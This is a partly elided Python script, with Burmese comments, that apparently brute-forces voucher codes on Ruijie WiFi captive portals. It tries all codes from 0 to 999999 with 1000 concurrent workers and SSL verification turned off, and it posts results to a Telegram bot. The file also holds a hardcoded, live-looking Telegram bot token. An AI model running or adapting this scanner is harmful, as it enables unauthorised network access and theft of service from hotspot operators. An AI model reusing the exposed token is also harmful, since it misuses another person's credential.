#!/usr/bin/env python3
# ==============================================
#  Ruijie Voucher Scanner  —  v7.0 (High Speed Edition)
...
THREADS           = 1000  # မြန်နှုန်းအမြင့်ဆုံးအတွက် 1000 သို့ တိုးထားသည်
START_CODE        = 0
END_CODE          = 999999
TELEGRAM_BOT_TOKEN = "8994851049:AAENDJZROisHv6JoNsONmiO4sLalhZeCFmY"
...
def send_telegram(message):
    ...
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=2)
    except:
        pass
...
# =============================================
#  ASYNC SCAN RUNNER (MAX SPEED BATCHING)
# =============================================
async def run_scan(session_url, start_code, end_code, workers, code_list=None):
    """Run the async scan — High speed engine inside."""
    ...
    # မြန်နှုန်းမြင့် TCP Connection ပမာဏကို မြှင့်ထားသည်
    _connector   = aiohttp.TCPConnector(limit=workers + 1000, ssl=False, keepalive_timeout=60)
    ...
    try:
        while not stop_flag:
            batch = []
            for _ in range(2000): # Batch size ကို 2000 သို့ တိုးမြှင့်ထားသည်
                try:
...
def main():
    ...
    print("[*] Ruijie Voucher Scanner Started (High Speed)")
